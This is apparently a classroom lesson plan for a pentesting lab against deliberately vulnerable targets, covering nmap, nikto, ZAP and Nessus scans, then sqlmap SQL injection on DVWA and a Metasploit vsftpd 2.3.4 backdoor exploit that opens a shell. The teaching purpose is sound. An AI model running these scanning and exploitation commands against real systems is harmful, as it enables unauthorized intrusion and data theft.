# Vulnerability Scanning Lab — Student Lesson Plan

> Cyber Security Academy — practical lab
> Targets run on the teacher's machine at `192.168.1.111`. Students connect from their own devices on the same LAN.

## 1. Learning Objectives

By the end of this session you should be able to:

1. Explain the difference between a **vulnerability** and an **exploit**.
2. Run a full recon → scanning → enumeration → exploitation flow on a target.
3. Read and interpret an nmap service scan.
4. Use a **vulnerability scanner** (Nessus / ZAP / nikto) and understand why scanners produce false positives.
5. Verify a reported vulnerability with an automated exploit (Metasploit) and understand the risk it represents.
6. Explain the legal and ethical rules of scanning (authorization, scope).

---

## 2. Lab Targets

| Target | Address (from student PC) | Purpose |
|---|---|---|
| OWASP Juice Shop | `http://192.168.1.111:3000` | Modern web app, API, JWT, XSS |
| DVWA | `http://192.168.1.111:8081` | Classic web vulns: SQLi, XSS, command injection |
| Metasploitable 2 | `http://192.168.1.111:80` + many ports | Intentionally vulnerable Linux box (real old CVEs) |
| Nessus | `https://192.168.1.111:8834` | The vulnerability scanner you will use |

Metasploitable open services: **21** (FTP/vsftpd), **22** (SSH), **23** (Telnet), **25** (SMTP), **80** (HTTP), **3306** (MySQL), **5900** (VNC), **5433** (PostgreSQL).

---

## 3. The Pentesting Methodology (explain these 5 phases)

```
1. RECONNAISSANCE  -> who/what is out there?           (passive / active)
2. SCANNING        -> which ports are open? which services?  (nmap)
3. ENUMERATION     -> dig deeper: versions, users, dirs, shares
4. VULNERABILITY ANALYSIS -> map findings to known CVEs, score risk
5. EXPLOITATION    -> prove the vuln with a real attack (Metasploit)
```

**Key terms to teach:**
- **CVE** — public ID for a known vulnerability (e.g. CVE-2011-2523 = vsftpd backdoor).
- **CVSS score** — 0-10 severity rating (0-3.9 low, 4-6.9 medium, 7-8.9 high, 9-10 critical).
- **False positive** — a scanner "finding" that isn't a real vuln. Always verify manually!
- **False negative** — a real vuln the scanner missed. No scanner is perfect.

---

## 4. Hands-on Phases

### Phase 1 — Reconnaissance

```bash
# Active recon: who is alive on the LAN?
nmap -sn 192.168.1.0/24

# Web fingerprinting
whatweb http://192.168.1.111:8081
whatweb http://192.168.1.111:3000
```

**Explain:** passive recon (browsing, search engines, OSINT) vs active recon (touching the target).

### Phase 2 — Port & Service Scanning

```bash
# Full service scan of Metasploitable
nmap -sV -p 21,22,23,25,80,3306,5900,5433 192.168.1.111

# Everything on every port (slower)
nmap -sV -p- 192.168.1.111
```

**Explain how to read output:** `PORT`, `STATE` (open/closed/filtered), `SERVICE`, `VERSION`. The version banner is what lets us find the exact CVE later.

### Phase 3 — Vulnerability Scanning

```bash
# nmap's built-in vuln scripts
nmap --script vuln 192.168.1.111

# Web server scanner (DVWA + Metasploitable)
nikto -h http://192.168.1.111:8081
nikto -h http://192.168.1.111:80

# OWASP ZAP baseline scan (runs in WSL container)
podman run --rm -v /opt/zap-wrk:/zap/wrk docker.io/zaproxy/zap-stable \
  zap-baseline.py -t http://192.168.1.111:8081 -r report.html
```

**Nessus (GUI):**
1. Log in at `https://192.168.1.111:8834`.
2. Create a new **Basic Network Scan**.
3. Target: `192.168.1.111`.
4. Run it, then open the report and look at the findings sorted by severity (Critical → Info).

**Explain:** Nessus checks *many* plugins and reports every match — students should expect a long list, mostly "Info" (e.g. missing HTTP headers), and should pick the Critical/High ones to investigate. That is the false-positive problem in practice.

### Phase 4 — Enumeration (dig deeper)

```bash
# Directory brute force (DVWA)
gobuster dir -u http://192.168.1.111:8081 -w /usr/share/wordlists/dirb/common.txt

# Look up known exploits for a service version
searchsploit vsftpd 2.3.4

# SMB shares
smbclient -L //192.168.1.111 -N
```

### Phase 5 — Exploitation (prove it, in a controlled lab)

SQL injection on DVWA (set DVWA Security Level = **low** first, log in as `admin`/`password`):

```bash
# Grab your PHPSESSID cookie after logging in, then:
sqlmap -u "http://192.168.1.111:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<your-session>; security=low" --batch --dbs
```

Metasploit vs vsftpd backdoor (CVE-2011-2523):

```bash
msfconsole
  use exploit/unix/ftp/vsftpd_234_backdoor
  set RHOSTS 192.168.1.111
  set RPORT 21
  run
```

If successful you get a shell on Metasploitable. **Explain:** this worked because vsftpd 2.3.4 ships a real backdoor — the scanner (Nessus) flagged the version, searchsploit confirmed the exploit exists, Metasploit executed it. This is the full chain.

---

## 5. Suggested Student Exercises

1. **Scan-to-report:** Run an nmap service scan on Metasploitable, then a Nessus scan. List which ports Nessus flagged Critical and which nmap version banners they map to.
2. **Two scanners, one target:** Compare nikto vs ZAP results on DVWA. Which findings overlap? Which are different? Why?
3. **False positive hunt:** Take 3 "High" findings from Nessus on Juice Shop and verify each manually in the browser — are they real or false positives?
4. **The full chain:** Find, verify, and exploit one CVE on Metasploitable (hint: vsftpd, UnrealIRCd, distcc, Samba). Write up: CVE id → CVSS → how the exploit works → impact if this were a real server.
5. **Burp Pro:** Proxy a Juice Shop session through Burp, intercept a login, and explain what the proxy shows (request/response, cookies, headers).

---

## 6. Ethics & Rules (read before starting)

- These targets are **authorized lab machines** owned by the academy.
- **Never** scan anything outside `192.168.1.111` without permission — your scans are visible in network logs.
- Vulnerability scanning is loud and detectable; real attackers often prefer stealth. Understanding scanning is about understanding the attacker's view, not about harming systems.
- Unauthorized scanning is **illegal** in most jurisdictions, even if no damage is done.
